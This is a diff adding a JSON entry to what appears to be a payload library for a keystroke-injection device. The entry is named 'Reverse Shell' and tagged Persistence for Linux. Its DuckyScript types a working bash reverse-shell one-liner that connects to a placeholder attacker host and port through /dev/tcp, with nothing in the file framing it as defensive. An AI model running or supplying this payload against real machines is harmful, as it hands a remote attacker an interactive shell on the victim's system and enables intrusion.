@@ -1,0 +1,7 @@
+{
+  "name": "Reverse Shell",
+  "category": "Persistence",
+  "os": "Linux",
+  "description": "Establish reverse shell connection",
+  "script": "REM Reverse Shell\nSTRING bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\nENTER\n"
+}
